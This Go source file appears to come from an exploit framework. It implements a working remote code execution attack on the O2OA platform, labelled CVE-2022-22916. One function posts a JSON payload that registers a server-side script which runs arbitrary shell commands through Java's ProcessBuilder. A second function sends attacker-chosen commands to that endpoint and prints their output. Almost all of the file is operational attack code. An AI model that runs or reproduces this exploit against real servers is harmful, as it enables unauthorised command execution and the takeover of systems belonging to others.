package exp_o2oa

import (
	"encoding/json"
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/code_invoke"
	"github.com/lz520520/railgunlib/pkg/templates/code_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
)

type result struct {
	Type    string `json:"type"`
	Message string `json:"message"`
	Date    string `json:"date"`
	Data    struct {
		ID    string `json:"id"`
		Value string `json:"value"`
	} `json:"data"`
	Spent    int    `json:"spent"`
	Size     int    `json:"size"`
	Count    int    `json:"count"`
	Position int    `json:"position"`
	Prompt   string `json:"prompt"`
}

type Exp_RCE_CVE_2022_22916 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_RCE_CVE_2022_22916) Attack_getmsg1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	createInvokeUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/x_program_center/jaxrs/invoke")
	headers.Set("Content-Type", "application/json")
	pathName := goutils.RandStr(10)

	payload := `{"name":"{{pathname}}","id":"{{pathname}}","alias":"","description":"","isNewInvoke":true,"text":"var ProcessBuilder = Java.type('java.lang.ProcessBuilder');\nvar Scanner = Java.type('java.util.Scanner');\n\nvar requestJson = JSON.parse(requestText);\nvar cmd = requestJson.cmd;\nvar cmds = [3];\n\nvar isWin = java.lang.System.getProperty('os.name').toLowerCase().contains('window');\nif (isWin) {\ncmds[0] = 'cmd.exe';\ncmds[1] = '/c';\ncmds[2] = cmd;  \n} else {\ncmds[0] = '/bin/sh';\ncmds[1] = '-c';\ncmds[2] = cmd;  \n}\nvar result = new Scanner(new ProcessBuilder(cmds).start().getInputStream()).useDelimiter('\\\\A').next();\nresult;","enableToken":false,"enable":true,"remoteAddrRegex":"","lastStartTime":"","lastEndTime":"","validated":true}`

	payload = strings.ReplaceAll(payload, "{{pathname}}", pathName)
	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(createInvokeUrl, payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	r := new(result)
	err := json.Unmarshal([]byte(httpresp.Body), r)
	if err != nil {
		self.EchoErrMsg("创建接口失败")
		return
	}
	if r.Type != "success" {
		self.EchoErrMsg(fmt.Sprintf("创建接口失败, msg: %s; prompt: %s;", r.Message, r.Prompt))
		return
	}
	self.EchoSuccessMsg("创建接口成功，接口名称为 " + pathName)
	expResult.Status = true

	return
}

func (self *Exp_RCE_CVE_2022_22916) Attack_cmd1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	pathName := self.MustGetStringParam("pathname")
	invokeUrl := goutils.AppendUri(self.Params.BaseParam.Target, fmt.Sprintf("/x_program_center/jaxrs/invoke/%s/execute", pathName))
	headers.Set("Content-Type", "application/json")

	payload := fmt.Sprintf(`{"cmd": "%s"}`, strings.ReplaceAll(self.MustGetStringParam("cmd"), `"`, `\"`))

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(invokeUrl, payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	r := new(result)
	err := json.Unmarshal([]byte(httpresp.Body), r)
	if err != nil {
		self.EchoErrMsg("调用接口失败")
		return
	}
	if r.Type != "success" {
		self.EchoErrMsg(fmt.Sprintf("调用接口失败, msg: %s; prompt: %s;", r.Message, r.Prompt))
		return
	}
	data := r.Data.Value

	tmp, err := UnicodeDecode(data)
	if err == nil {
		data = tmp
	}
	data = strings.ReplaceAll(data, "\\r", "\r")
	data = strings.ReplaceAll(data, "\\n", "\n")

	self.EchoSuccessMsg(data)

	return
}

// #####################编码转换模块生成#########################
func UnicodeDecode(src string) (dst string, err error) {
	codeParams := []code_model.CodeParams{

		{
			CodeType:    "char",
			CodeName:    "Unicode",
			CodeMode:    "Decode",
			CodeOptions: []code_model.CodeOption{},
		},
	}
	return code_invoke.CodeInvoke(src, codeParams)
}

// #####################编码转换模块生成#########################

func init() {

	exp_register.ExpStructRegister(&Exp_RCE_CVE_2022_22916{}, "exp_RCE_CVE_2022_22916.yml")

}
